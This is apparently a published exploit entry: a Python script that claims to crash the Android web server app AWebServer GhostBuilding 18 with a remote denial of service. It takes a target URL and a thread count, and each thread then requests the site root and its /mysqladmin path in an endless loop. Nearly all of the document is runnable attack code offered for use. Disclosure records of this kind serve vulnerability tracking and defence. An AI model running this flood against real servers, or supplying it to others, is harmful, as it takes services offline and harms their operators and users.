# Exploit Title: AWebServer GhostBuilding 18 - Denial of Service (DoS)
# Date: 28/12/2021
# Exploit Author: Andres Ramos [Invertebrado]
# Vendor Homepage: http://sylkat-tools.rf.gd/awebserver.htm
# Software Link: https://play.google.com/store/apps/details?id=com.sylkat.apache&hl=en
# Version: AWebServer GhostBuilding 18
# Tested on: Android

#!/usr/bin/python3

# *********************************************************************************
# * 	               	 Author: Andres Ramos [Invertebrado]                      *
# *  AWebServer GhostBuilding 18 - Remote Denial of Service (DoS) & System Crash  *
# *********************************************************************************

import signal
import requests
from pwn import *

#Colors
class colors():
        GREEN = "\033[0;32m\033[1m"
        END = "\033[0m"
        RED = "\033[0;31m\033[1m"
        BLUE = "\033[0;34m\033[1m"
        YELLOW = "\033[0;33m\033[1m"
        PURPLE = "\033[0;35m\033[1m"
        TURQUOISE = "\033[0;36m\033[1m"
        GRAY = "\033[0;37m\033[1m"

exit = False

def def_handler(sig, frame):
	print(colors.RED + "\n[!] Exiting..." + colors.END)
	exit = True
	sys.exit(0)

	if threading.activeCount() > 1:
		os.system("tput cnorm")
		os._exit(getattr(os, "_exitcode", 0))
	else:
		os.system("tput cnorm")
		sys.exit(getattr(os, "_exitcode", 0))

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 3:
	print(colors.RED + "\n[!] Usage: " + colors.YELLOW + "{} ".format(sys.argv[0]) + colors.RED + "<" + colors.BLUE + "URL" + colors.RED + "> <" + colors.BLUE + "THREADS" + colors.RED +">" + colors.END)
	sys.exit(1)

url = sys.argv[1]
Tr = sys.argv[2]

def http():
	counter = 0
	p1 = log.progress(colors.TURQUOISE + "Requests" + colors.END)
	while True:
		r = requests.get(url)
		r = requests.get(url + "/mysqladmin")
		counter += 2
		p1.status(colors.YELLOW + "({}) ({}/mysqladmin)".format(url, url) + colors.GRAY + " = " + colors.GREEN + "[{}]".format(counter) + colors.END)

		if exit:
			break

if __name__ == '__main__':

	threads = []

	try:
		for i in range(0, int(Tr)):
			t = threading.Thread(target=http)
			threads.append(t)

			sys.stderr = open("/dev/null", "w")

		for x in threads:
			x.start()

		for x in threads:
			x.join()

	except Exception as e:
		log.failure(str(e))
		sys.exit(1)